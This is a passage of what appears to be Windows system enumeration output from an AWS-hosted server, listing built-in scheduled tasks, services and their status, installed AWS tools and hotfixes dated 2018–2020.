TaskName    : \Microsoft\Windows\Defrag\ScheduledDefrag
Run As User : SYSTEM
Task To Run : %windir%\system32\defrag.exe -c -h -k -g -$

TaskName    : \Microsoft\Windows\Device Information\Device
Run As User : SYSTEM
Task To Run : %windir%\system32\devicecensus.exe 

TaskName    : \Microsoft\Windows\Device Information\Device
Run As User : SYSTEM
Task To Run : %windir%\system32\devicecensus.exe 

TaskName    : \Microsoft\Windows\Device Setup\Metadata Refresh
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Diagnosis\Scheduled
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\DirectX\DXGIAdapterCache
Run As User : SYSTEM
Task To Run : %windir%\system32\dxgiadaptercache.exe 

TaskName    : \Microsoft\Windows\DirectX\DXGIAdapterCache
Run As User : SYSTEM
Task To Run : %windir%\system32\dxgiadaptercache.exe 

TaskName    : \Microsoft\Windows\DiskCleanup\SilentCleanup
Run As User : Users
Task To Run : %windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%

TaskName    : \Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticDataCollector
Run As User : SYSTEM
Task To Run : %windir%\system32\rundll32.exe dfdts.dll,DfdGetDefaultPolicyAndSMART

TaskName    : \Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticResolver
Run As User : Users
Task To Run : %windir%\system32\DFDWiz.exe 

TaskName    : \Microsoft\Windows\DiskFootprint\Diagnostics
Run As User : SYSTEM
Task To Run : %windir%\system32\disksnapshot.exe -z

TaskName    : \Microsoft\Windows\DiskFootprint\StorageSense
Run As User : Users
Task To Run : COM handler

TaskName    : \Microsoft\Windows\EDP\EDP App Launch Task
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\EDP\EDP Auth Task
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\EDP\EDP Inaccessible Credentials Task
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\EDP\StorageCardEncryption Task
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\File Classification Infrastructure\Property Definition Sync
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Flighting\FeatureConfig\ReconcileFeatures
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Flighting\OneSettings\RefreshCache
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\InstallService\ScanForUpdates
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\InstallService\ScanForUpdates
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\InstallService\ScanForUpdates
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\InstallService\ScanForUpdatesAsUser
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\InstallService\SmartRetry
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\InstallService\SmartRetry
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\InstallService\SmartRetry
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\InstallService\SmartRetry
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\InstallService\SmartRetry
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\InstallService\SmartRetry
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\InstallService\WakeUpAndContinueUpdates
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\InstallService\WakeUpAndScanForUpdates
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\LanguageComponentsInstaller\Installation
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\LanguageComponentsInstaller\Installation
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\LanguageComponentsInstaller\Uninstallation
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\License Manager\TempSignedLicenseExchange
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Location\Notifications
Run As User : Authenticated Users
Task To Run : %windir%\System32\LocationNotificationWindows.exe 

TaskName    : \Microsoft\Windows\Location\WindowsActionDialog
Run As User : Authenticated Users
Task To Run : %windir%\System32\WindowsActionDialog.exe 

TaskName    : \Microsoft\Windows\Maintenance\WinSAT
Run As User : Administrators
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Maps\MapsToastTask
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Maps\MapsUpdateTask
Run As User : NETWORK SERVICE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents
Run As User : Administrators
Task To Run : COM handler

TaskName    : \Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents
Run As User : Administrators
Task To Run : COM handler

TaskName    : \Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents
Run As User : Administrators
Task To Run : COM handler

TaskName    : \Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents
Run As User : Administrators
Task To Run : COM handler

TaskName    : \Microsoft\Windows\MemoryDiagnostic\RunFullMemoryDiagnostic
Run As User : Administrators
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Mobile Broadband Accounts\MNO Metadata Parser
Run As User : SYSTEM
Task To Run : %SystemRoot%\System32\MbaeParserTask.exe 

TaskName    : \Microsoft\Windows\MUI\LPRemove
Run As User : SYSTEM
Task To Run : %windir%\system32\lpremove.exe 

TaskName    : \Microsoft\Windows\Multimedia\SystemSoundsService
Run As User : Users
Task To Run : COM handler

TaskName    : \Microsoft\Windows\NetTrace\GatherNetworkInfo
Run As User : Users
Task To Run : %windir%\system32\gatherNetworkInfo.vbs 

TaskName    : \Microsoft\Windows\Network Controller\SDN Diagnostics Task
Run As User : SYSTEM
Task To Run : %windir%\System32\SDNDiagnosticsTask.exe 

TaskName    : \Microsoft\Windows\Network Controller\SDN Diagnostics Task
Run As User : SYSTEM
Task To Run : %windir%\System32\SDNDiagnosticsTask.exe 

TaskName    : \Microsoft\Windows\Offline Files\Background Synchronization
Run As User : Authenticated Users
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Offline Files\Logon Synchronization
Run As User : Authenticated Users
Task To Run : COM handler

TaskName    : \Microsoft\Windows\PI\Secure-Boot-Update
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\PI\Sqm-Tasks
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\PLA\Server Manager Performance Monitor
Run As User : SYSTEM
Task To Run : %systemroot%\system32\rundll32.exe %systemroot%\system32\pla.dll,PlaHost Server Manager Performance 
              Monitor" "$(Arg0)""

TaskName    : \Microsoft\Windows\Plug and Play\Device Install Group Policy
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Plug and Play\Device Install Reboot Required
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Plug and Play\Device Install Reboot Required
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Plug and Play\Sysprep Generalize Drivers
Run As User : SYSTEM
Task To Run : %SystemRoot%\System32\drvinst.exe 6

TaskName    : \Microsoft\Windows\Power Efficiency Diagnostics\AnalyzeSystem
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\PushToInstall\LoginCheck
Run As User : SYSTEM
Task To Run : %windir%\system32\sc.exe start pushtoinstall login

TaskName    : \Microsoft\Windows\PushToInstall\Registration
Run As User : SYSTEM
Task To Run : %windir%\system32\sc.exe start pushtoinstall registration

TaskName    : \Microsoft\Windows\PushToInstall\Registration
Run As User : SYSTEM
Task To Run : %windir%\system32\sc.exe start pushtoinstall registration

TaskName    : \Microsoft\Windows\Ras\MobilityManager
Run As User : LOCAL SERVICE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\RecoveryEnvironment\VerifyWinRE
Run As User : Administrators
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Registry\RegIdleBackup
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Server Manager\CleanupOldPerfLogs
Run As User : SYSTEM
Task To Run : %systemroot%\system32\cscript.exe /B /nologo %systemroot%\system32\calluxxprovider.vbs $(Arg0) $(Arg1) 
              $(Arg2)

TaskName    : \Microsoft\Windows\Server Manager\ServerManager
Run As User : Administrators
Task To Run : %windir%\system32\ServerManagerLauncher.exe 

TaskName    : \Microsoft\Windows\Servicing\StartComponentCleanup
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\SharedPC\Account Cleanup
Run As User : SYSTEM
Task To Run : %windir%\System32\rundll32.exe %windir%\System32\Windows.SharedPC.AccountManager.dll,StartMaintenance

TaskName    : \Microsoft\Windows\Shell\CreateObjectTask
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Shell\IndexerAutomaticMaintenance
Run As User : LOCAL SERVICE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Software Inventory Logging\Collection
Run As User : SYSTEM
Task To Run : %systemroot%\system32\cmd.exe /d /c %systemroot%\system32\silcollector.cmd publish

TaskName    : \Microsoft\Windows\Software Inventory Logging\Configuration
Run As User : SYSTEM
Task To Run : %systemroot%\system32\cmd.exe /d /c %systemroot%\system32\silcollector.cmd configure

TaskName    : \Microsoft\Windows\SoftwareProtectionPlatform\SvcRestartTask
Run As User : NETWORK SERVICE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\SoftwareProtectionPlatform\SvcRestartTaskLogon
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\SoftwareProtectionPlatform\SvcRestartTaskNetwork
Run As User : NETWORK SERVICE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\SpacePort\SpaceAgentTask
Run As User : SYSTEM
Task To Run : %windir%\system32\SpaceAgent.exe 

TaskName    : \Microsoft\Windows\SpacePort\SpaceAgentTask
Run As User : SYSTEM
Task To Run : %windir%\system32\SpaceAgent.exe 

TaskName    : \Microsoft\Windows\SpacePort\SpaceManagerTask
Run As User : SYSTEM
Task To Run : %windir%\system32\spaceman.exe /Work

TaskName    : \Microsoft\Windows\SpacePort\SpaceManagerTask
Run As User : SYSTEM
Task To Run : %windir%\system32\spaceman.exe /Work

TaskName    : \Microsoft\Windows\Speech\HeadsetButtonPress
Run As User : INTERACTIVE
Task To Run : %windir%\system32\speech_onecore\common\SpeechRuntime.exe StartedFromTask

TaskName    : \Microsoft\Windows\Speech\SpeechModelDownloadTask
Run As User : NETWORK SERVICE
Task To Run : %windir%\system32\speech_onecore\common\SpeechModelDownload.exe 

TaskName    : \Microsoft\Windows\Storage Tiers Management\Storage Tiers Management Initialization
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Storage Tiers Management\Storage Tiers Optimization
Run As User : SYSTEM
Task To Run : %windir%\system32\defrag.exe -c -h -g -# -m 8 -i 13500

TaskName    : \Microsoft\Windows\Task Manager\Interactive
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\termsrv\RemoteFX\RemoteFXvGPUDisableTask
Run As User : SYSTEM
Task To Run : %windir%\System32\RemoteFXvGPUDisablement.exe Disable

TaskName    : \Microsoft\Windows\termsrv\RemoteFX\RemoteFXWarningTask
Run As User : Users
Task To Run : %windir%\System32\RemoteFXvGPUDisablement.exe Warning

TaskName    : \Microsoft\Windows\TextServicesFramework\MsCtfMonitor
Run As User : Users
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Time Synchronization\ForceSynchronizeTime
Run As User : LOCAL SERVICE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Time Synchronization\SynchronizeTime
Run As User : LOCAL SERVICE
Task To Run : %windir%\system32\sc.exe start w32time task_started

TaskName    : \Microsoft\Windows\Time Zone\SynchronizeTimeZone
Run As User : SYSTEM
Task To Run : %windir%\system32\tzsync.exe 

TaskName    : \Microsoft\Windows\TPM\Tpm-HASCertRetr
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\TPM\Tpm-Maintenance
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\TPM\Tpm-Maintenance
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\TPM\Tpm-Maintenance
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\TPM\Tpm-Maintenance
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\UpdateOrchestrator\Schedule Scan
Run As User : SYSTEM
Task To Run : %systemroot%\system32\usoclient.exe StartScan

TaskName    : \Microsoft\Windows\UpdateOrchestrator\Schedule Scan Static Task
Run As User : SYSTEM
Task To Run : %systemroot%\system32\usoclient.exe StartScan

TaskName    : \Microsoft\Windows\UpdateOrchestrator\Schedule Scan Static Task
Run As User : SYSTEM
Task To Run : %systemroot%\system32\usoclient.exe StartScan

TaskName    : \Microsoft\Windows\UpdateOrchestrator\Schedule Scan Static Task
Run As User : SYSTEM
Task To Run : %systemroot%\system32\usoclient.exe StartScan

TaskName    : \Microsoft\Windows\UpdateOrchestrator\Schedule Scan Static Task
Run As User : SYSTEM
Task To Run : %systemroot%\system32\usoclient.exe StartScan

TaskName    : \Microsoft\Windows\UpdateOrchestrator\Schedule Scan Static Task
Run As User : SYSTEM
Task To Run : %systemroot%\system32\usoclient.exe StartScan

TaskName    : \Microsoft\Windows\UpdateOrchestrator\USO_UxBroker
Run As User : SYSTEM
Task To Run : %systemroot%\system32\MusNotification.exe 

TaskName    : \Microsoft\Windows\UpdateOrchestrator\USO_UxBroker
Run As User : SYSTEM
Task To Run : %systemroot%\system32\MusNotification.exe 

TaskName    : \Microsoft\Windows\UPnP\UPnPHostConfig
Run As User : SYSTEM
Task To Run : sc.exe config upnphost start= auto

TaskName    : \Microsoft\Windows\User Profile Service\HiveUploadTask
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\WaaSMedic\PerformRemediation
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\WDI\ResolutionHost
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Windows Error Reporting\QueueReporting
Run As User : SYSTEM
Task To Run : %windir%\system32\wermgr.exe -upload

TaskName    : \Microsoft\Windows\Windows Error Reporting\QueueReporting
Run As User : SYSTEM
Task To Run : %windir%\system32\wermgr.exe -upload

TaskName    : \Microsoft\Windows\Windows Error Reporting\QueueReporting
Run As User : SYSTEM
Task To Run : %windir%\system32\wermgr.exe -upload

TaskName    : \Microsoft\Windows\Windows Error Reporting\QueueReporting
Run As User : SYSTEM
Task To Run : %windir%\system32\wermgr.exe -upload

TaskName    : \Microsoft\Windows\Windows Filtering Platform\BfeOnServiceStartTypeChange
Run As User : SYSTEM
Task To Run : %windir%\system32\rundll32.exe bfe.dll,BfeOnServiceStartTypeChange

TaskName    : \Microsoft\Windows\Windows Media Sharing\UpdateLibrary
Run As User : Authenticated Users
Task To Run : %ProgramFiles%\Windows Media Player\wmpnscfg.exe" "

TaskName    : \Microsoft\Windows\WindowsColorSystem\Calibration Loader
Run As User : Users
Task To Run : COM handler

TaskName    : \Microsoft\Windows\WindowsColorSystem\Calibration Loader
Run As User : Users
Task To Run : COM handler

TaskName    : \Microsoft\Windows\WindowsUpdate\Scheduled Start
Run As User : SYSTEM
Task To Run : C:\Windows\system32\sc.exe start wuauserv

TaskName    : \Microsoft\Windows\WindowsUpdate\Scheduled Start
Run As User : SYSTEM
Task To Run : C:\Windows\system32\sc.exe start wuauserv

TaskName    : \Microsoft\Windows\WindowsUpdate\Scheduled Start
Run As User : SYSTEM
Task To Run : C:\Windows\system32\sc.exe start wuauserv

TaskName    : \Microsoft\Windows\WindowsUpdate\Scheduled Start
Run As User : SYSTEM
Task To Run : C:\Windows\system32\sc.exe start wuauserv

TaskName    : \Microsoft\Windows\Wininet\CacheTask
Run As User : Users
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Workplace Join\Automatic-Device-Join
Run As User : SYSTEM
Task To Run : %SystemRoot%\System32\dsregcmd.exe $(Arg0) $(Arg1) $(Arg2)

TaskName    : \Microsoft\Windows\Workplace Join\Automatic-Device-Join
Run As User : SYSTEM
Task To Run : %SystemRoot%\System32\dsregcmd.exe $(Arg0) $(Arg1) $(Arg2)

TaskName    : \Microsoft\Windows\Workplace Join\Recovery-Check
Run As User : INTERACTIVE
Task To Run : %SystemRoot%\System32\dsregcmd.exe /checkrecovery




-----------------------------------------------------------
 Services
-----------------------------------------------------------

Name                                     DisplayName                                                                         Status
----                                     -----------                                                                         ------
PcaSvc                                   Program Compatibility Assistant Service                                            Stopped
NgcSvc                                   Microsoft Passport                                                                 Stopped
PhoneSvc                                 Phone Service                                                                      Stopped
PerfHost                                 Performance Counter DLL Host                                                       Stopped
NetSetupSvc                              Network Setup Service                                                              Stopped
Netman                                   Network Connections                                                                Stopped
NgcCtnrSvc                               Microsoft Passport Container                                                       Stopped
NetTcpPortSharing                        Net.Tcp Port Sharing Service                                                       Stopped
PimIndexMaintenanceSvc_2647e             Contact Data_2647e                                                                 Stopped
PrintWorkflowUserSvc_2647e               PrintWorkflow_2647e                                                                Stopped
PrintNotify                              Printer Extensions and Notifications                                               Stopped
QWAVE                                    Quality Windows Audio Video Experience                                             Stopped
PushToInstall                            Windows PushToInstall Service                                                      Stopped
UserDataSvc_2647e                        User Data Access_2647e                                                             Stopped
pla                                      Performance Logs & Alerts                                                          Stopped
UnistoreSvc_2647e                        User Data Storage_2647e                                                            Stopped
upnphost                                 UPnP Device Host                                                                   Stopped
lfsvc                                    Geolocation Service                                                                Stopped
vmictimesync                             Hyper-V Time Synchronization Service                                               Stopped
lltdsvc                                  Link-Layer Topology Discovery Mapper                                               Stopped
vmicshutdown                             Hyper-V Guest Shutdown Service                                                     Stopped
KPSSVC                                   KDC Proxy Server service (KPS)                                                     Stopped
vmicvss                                  Hyper-V Volume Shadow Copy Requestor                                               Stopped
vmicvmsession                            Hyper-V PowerShell Direct Service                                                  Stopped
KtmRm                                    KtmRm for Distributed Transaction Coordinator                                      Stopped
vmicrdv                                  Hyper-V Remote Desktop Virtualization Service                                      Stopped
msiserver                                Windows Installer                                                                  Stopped
MSiSCSI                                  Microsoft iSCSI Initiator Service                                                  Stopped
Netlogon                                 Netlogon                                                                           Stopped
NcaSvc                                   Network Connectivity Assistant                                                     Stopped
MapsBroker                               Downloaded Maps Manager                                                            Stopped
vmickvpexchange                          Hyper-V Data Exchange Service                                                      Stopped
vmicguestinterface                       Hyper-V Guest Service Interface                                                    Stopped
vmicheartbeat                            Hyper-V Heartbeat Service                                                          Stopped
shpamsvc                                 Shared PC Account Manager                                                          Stopped
SharedAccess                             Internet Connection Sharing (ICS)                                                  Stopped
SNMPTRAP                                 SNMP Trap                                                                          Stopped
smphost                                  Microsoft Storage Spaces SMP                                                       Stopped
SensorService                            Sensor Service                                                                     Stopped
SensorDataService                        Sensor Data Service                                                                Stopped
SgrmBroker                               System Guard Runtime Monitor Broker                                                Stopped
SensrSvc                                 Sensor Monitoring Service                                                          Stopped
TieringEngineService                     Storage Tiers Management                                                           Stopped
svsvc                                    Spot Verifier                                                                      Stopped
stisvc                                   Windows Image Acquisition (WIA)                                                    Stopped
tapisrv                                  Telephony                                                                          Stopped
swprv                                    Microsoft Software Shadow Copy Provider                                            Stopped
SSDPSRV                                  SSDP Discovery                                                                     Stopped
sppsvc                                   Software Protection                                                                Stopped
SstpSvc                                  Secure Socket Tunneling Protocol Service                                           Stopped
ssh-agent                                OpenSSH Authentication Agent                                                       Stopped
UevAgentService                          User Experience Virtualization Service                                             Stopped
RmSvc                                    Radio Management Service                                                           Stopped
RSoPProv                                 Resultant Set of Policy Provider                                                   Stopped
RpcLocator                               Remote Procedure Call (RPC) Locator                                                Stopped
RasMan                                   Remote Access Connection Manager                                                   Stopped
RasAuto                                  Remote Access Auto Connection Manager                                              Stopped
RemoteRegistry                           Remote Registry                                                                    Stopped
RemoteAccess                             Routing and Remote Access                                                          Stopped
sacsvr                                   Special Administration Console Helper                                              Stopped
SecurityHealthService                    Windows Security Service                                                           Stopped
seclogon                                 Secondary Logon                                                                    Stopped
Sense                                    Windows Defender Advanced Threat Protection Service                                Stopped
SEMgrSvc                                 Payments and NFC/SE Manager                                                        Stopped
SCardSvr                                 Smart Card                                                                         Stopped
tzautoupdate                             Auto Time Zone Updater                                                             Stopped
SCPolicySvc                              Smart Card Removal Policy                                                          Stopped
ScDeviceEnum                             Smart Card Device Enumeration Service                                              Stopped
AppReadiness                             App Readiness                                                                      Stopped
AppMgmt                                  Application Management                                                             Stopped
CscService                               Offline Files                                                                      Stopped
ConsentUxUserSvc_2647e                   ConsentUX_2647e                                                                    Stopped
wisvc                                    Windows Insider Service                                                            Stopped
AppVClient                               Microsoft App-V Client                                                             Stopped
COMSysApp                                COM+ System Application                                                            Stopped
Appinfo                                  Application Information                                                            Stopped
DevicesFlowUserSvc_2647e                 DevicesFlow_2647e                                                                  Stopped
DevQueryBroker                           DevQuery Background Discovery Broker                                               Stopped
wercplsupport                            Problem Reports and Solutions Control Panel Support                                Stopped
DevicePickerUserSvc_2647e                DevicePicker_2647e                                                                 Stopped
WiaRpc                                   Still Image Acquisition Events                                                     Stopped
DeviceAssociationService                 Device Association Service                                                         Stopped
WerSvc                                   Windows Error Reporting Service                                                    Stopped
cfn-hup                                  CloudFormation cfn-hup                                                             Stopped
BTAGService                              Bluetooth Audio Gateway Service                                                    Stopped
BthAvctpSvc                              AVCTP service                                                                      Stopped
AudioEndpointBuilder                     Windows Audio Endpoint Builder                                                     Stopped
WPDBusEnum                               Portable Device Enumerator Service                                                 Stopped
AxInstSV                                 ActiveX Installer (AxInstSV)                                                       Stopped
Audiosrv                                 Windows Audio                                                                      Stopped
BITS                                     Background Intelligent Transfer Service                                            Stopped
bthserv                                  Bluetooth Support Service                                                          Stopped
WMPNetworkSvc                            Windows Media Player Network Sharing Service                                       Stopped
wmiApSrv                                 WMI Performance Adapter                                                            Stopped
wlidsvc                                  Microsoft Account Sign-in Assistant                                                Stopped
WSearch                                  Windows Search                                                                     Stopped
camsvc                                   Capability Access Manager Service                                                  Stopped
CaptureService_2647e                     CaptureService_2647e                                                               Stopped
cbdhsvc_2647e                            Clipboard User Service_2647e                                                       Stopped
diagnosticshub.standardcollector.service Microsoft (R) Diagnostics Hub Standard Collector Service                           Stopped
fdPHost                                  Function Discovery Provider Host                                                   Stopped
FDResPub                                 Function Discovery Resource Publication                                            Stopped
WalletService                            WalletService                                                                      Stopped
WarpJITSvc                               WarpJITSvc                                                                         Stopped
embeddedmode                             Embedded Mode                                                                      Stopped
EntAppSvc                                Enterprise App Management Service                                                  Stopped
WbioSrvc                                 Windows Biometric Service                                                          Stopped
FrameServer                              Windows Camera Frame Server                                                        Stopped
icssvc                                   Windows Mobile Hotspot Service                                                     Stopped
InstallService                           Microsoft Store Install Service                                                    Stopped
VSS                                      Volume Shadow Copy                                                                 Stopped
HvHost                                   HV Host Service                                                                    Stopped
WaaSMedicSvc                             Windows Update Medic Service                                                       Stopped
GraphicsPerfSvc                          GraphicsPerfSvc                                                                    Stopped
hidserv                                  Human Interface Device Service                                                     Stopped
AJRouter                                 AllJoyn Router Service                                                             Stopped
WEPHOSTSVC                               Windows Encryption Provider Host Service                                           Stopped
Wecsvc                                   Windows Event Collector                                                            Stopped
AppIDSvc                                 Application Identity                                                               Stopped
DiagTrack                                Connected User Experiences and Telemetry                                           Stopped
DmEnrollmentSvc                          Device Management Enrollment Service                                               Stopped
dmwappushservice                         Device Management Wireless Application Protocol (WAP) Push message Routing Service Stopped
dot3svc                                  Wired AutoConfig                                                                   Stopped
Eaphost                                  Extensible Authentication Protocol                                                 Stopped
ALG                                      Application Layer Gateway Service                                                  Stopped
WdiServiceHost                           Diagnostic Service Host                                                            Stopped
EFS                                      Encrypting File System (EFS)                                                       Stopped
WdiSystemHost                            Diagnostic System Host                                                             Stopped
TermService                              Remote Desktop Services                                                            Running
WpnUserService_2647e                     Windows Push Notifications User Service_2647e                                      Running
Themes                                   Themes                                                                             Running
wuauserv                                 Windows Update                                                                     Running
TabletInputService                       Touch Keyboard and Handwriting Panel Service                                       Running
TimeBrokerSvc                            Time Broker                                                                        Running
UsoSvc                                   Update Orchestrator Service                                                        Running
UserManager                              User Manager                                                                       Running
UmRdpService                             Remote Desktop Services UserMode Port Redirector                                   Running
Wcmsvc                                   Windows Connection Manager                                                         Running
W32Time                                  Windows Time                                                                       Running
vds                                      Virtual Disk                                                                       Running
VaultSvc                                 Credential Manager                                                                 Running
WinHttpAutoProxySvc                      WinHTTP Web Proxy Auto-Discovery Service                                           Running
TrkWks                                   Distributed Link Tracking Client                                                   Running
TokenBroker                              Web Account Manager                                                                Running
WpnService                               Windows Push Notifications System Service                                          Running
TrustedInstaller                         Windows Modules Installer                                                          Running
Winmgmt                                  Windows Management Instrumentation                                                 Running
WinRM                                    Windows Remote Management (WS-Management)                                          Running
UALSVC                                   User Access Logging Service                                                        Running
DPS                                      Diagnostic Policy Service                                                          Running
DsmSvc                                   Device Setup Manager                                                               Running
DsSvc                                    Data Sharing Service                                                               Running
Dhcp                                     DHCP Client                                                                        Running
Dnscache                                 DNS Client                                                                         Running
DoSvc                                    Delivery Optimization                                                              Running
EventLog                                 Windows Event Log                                                                  Running
IKEEXT                                   IKE and AuthIP IPsec Keying Modules                                                Running
iphlpsvc                                 IP Helper                                                                          Running
KeyIso                                   CNG Key Isolation                                                                  Running
EventSystem                              COM+ Event System                                                                  Running
FontCache                                Windows Font Cache Service                                                         Running
gpsvc                                    Group Policy Client                                                                Running
DeviceInstall                            Device Install Service                                                             Running
BFE                                      Base Filtering Engine                                                              Running
BrokerInfrastructure                     Background Tasks Infrastructure Service                                            Running
CDPSvc                                   Connected Devices Platform Service                                                 Running
AmazonSSMAgent                           Amazon SSM Agent                                                                   Running
AppXSvc                                  AppX Deployment Service (AppXSVC)                                                  Running
AWSLiteAgent                             AWS Lite Guest Agent                                                               Running
CDPUserSvc_2647e                         Connected Devices Platform User Service_2647e                                      Running
CryptSvc                                 Cryptographic Services                                                             Running
DcomLaunch                               DCOM Server Process Launcher                                                       Running
defragsvc                                Optimize drives                                                                    Running
CertPropSvc                              Certificate Propagation                                                            Running
ClipSVC                                  Client License Service (ClipSVC)                                                   Running
CoreMessagingRegistrar                   CoreMessaging                                                                      Running
SamSs                                    Security Accounts Manager                                                          Running
Schedule                                 Task Scheduler                                                                     Running
SENS                                     System Event Notification Service                                                  Running
ProfSvc                                  User Profile Service                                                               Running
RpcEptMapper                             RPC Endpoint Mapper                                                                Running
RpcSs                                    Remote Procedure Call (RPC)                                                        Running
SessionEnv                               Remote Desktop Configuration                                                       Running
StorSvc                                  Storage Service                                                                    Running
SysMain                                  SysMain                                                                            Running
SystemEventsBroker                       System Events Broker                                                               Running
ShellHWDetection                         Shell Hardware Detection                                                           Running
Spooler                                  Print Spooler                                                                      Running
StateRepository                          State Repository Service                                                           Running
Power                                    Power                                                                              Running
lmhosts                                  TCP/IP NetBIOS Helper                                                              Running
LSM                                      Local Session Manager                                                              Running
mpssvc                                   Windows Defender Firewall                                                          Running
LanmanServer                             Server                                                                             Running
LanmanWorkstation                        Workstation                                                                        Running
LicenseManager                           Windows License Manager Service                                                    Running
MSDTC                                    Distributed Transaction Coordinator                                                Running
nsi                                      Network Store Interface Service                                                    Running
PlugPlay                                 Plug and Play                                                                      Running
PolicyAgent                              IPsec Policy Agent                                                                 Running
NcbService                               Network Connection Broker                                                          Running
netprofm                                 Network List Service                                                               Running
NlaSvc                                   Network Location Awareness                                                         Running




-----------------------------------------------------------
 Installed Programs
-----------------------------------------------------------

AWS Tools for Windows 3.15.1110  AWS Tools for Windows
Amazon SSM Agent      2.3.1319.0 Amazon SSM Agent     
AWS PV Drivers        8.3.4      AWS PV Drivers       
aws-cfn-bootstrap     1.4.33     aws-cfn-bootstrap    



-----------------------------------------------------------
 Installed Patches
-----------------------------------------------------------

HotFixID  InstalledOn           
--------  -----------           
KB4570720 9/9/2020 12:00:00 AM  
KB4470502 12/12/2018 12:00:00 AM
KB4470788 12/12/2018 12:00:00 AM
KB4480056 1/9/2019 12:00:00 AM  
KB4493510 4/21/2019 12:00:00 AM 
KB4494174 3/18/2020 12:00:00 AM 
KB4499728 5/15/2019 12:00:00 AM 
KB4504369 6/12/2019 12:00:00 AM 
KB4512577 9/11/2019 12:00:00 AM 
KB4512937 9/6/2019 12:00:00 AM  
KB4521862 10/9/2019 12:00:00 AM 
KB4523204 11/13/2019 12:00:00 AM
KB4539571 3/18/2020 12:00:00 AM 
KB4549947 4/15/2020 12:00:00 AM 
KB4558997 7/15/2020 12:00:00 AM 
KB4561600 6/10/2020 12:00:00 AM 
KB4562562 6/10/2020 12:00:00 AM 
KB4566424 8/12/2020 12:00:00 AM 
KB4570332 9/9/2020 12:00:00 AM  
